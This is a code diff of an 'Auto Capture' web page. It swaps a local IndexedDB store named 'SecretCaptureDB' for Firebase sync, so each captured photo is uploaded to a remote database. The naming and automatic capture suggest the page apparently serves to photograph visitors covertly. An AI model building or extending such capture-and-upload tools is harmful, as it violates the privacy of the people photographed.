@@ -3,7 +3,11 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>📸 Auto Capture</title>
+<title>📸 Auto Capture (Firebase Sync)</title>
+    <!-- Firebase SDK -->
+    <script src="https://www.gstatic.com/firebasejs/10.14.1/firebase-app-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/10.14.1/firebase-database-compat.js"></script>
+    <script src="firebase-config.js"></script>
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
         body { 
@@ -77,31 +81,16 @@
     </div>
     
     <script>
-        let db;
-        
-        // Init DB sama dengan gallery
-        async function initDB() {
-            return new Promise((resolve, reject) => {
-                const request = indexedDB.open('SecretCaptureDB', 1);
-                request.onerror = () => reject(request.error);
-                request.onsuccess = () => {
-                    db = request.result;
-                    resolve();
-                };
-                request.onupgradeneeded = (e) => {
-                    const db = e.target.result;
-                    db.createObjectStore('photos', { keyPath: 'id', autoIncrement: true });
-                };
-            });
-        }
+        // Firebase (sync dengan gallery)
+        firebase.initializeApp(firebaseConfig);
+        const dbRef = firebase.database().ref('photos');
         
         async function savePhoto(dataUrl, timestamp) {
             return new Promise((resolve, reject) => {
-                const transaction = db.transaction(['photos'], 'readwrite');
-                const store = transaction.objectStore('photos');
-                const request = store.add({ dataUrl, timestamp });
-                request.onsuccess = () => resolve(request.result);
-                request.onerror = () => reject(request.error);
+                const newPhotoRef = dbRef.push();
+                newPhotoRef.set({ dataUrl, timestamp })
+                    .then(() => resolve())
+                    .catch(reject);
             });
         }
         
@@ -113,7 +102,7 @@
                 const status = document.getElementById('status');
                 const success = document.getElementById('success');
                 
-                await initDB();
+// No local DB needed
                 
                 status.textContent = 'Tunggu 3 detik...';
                 
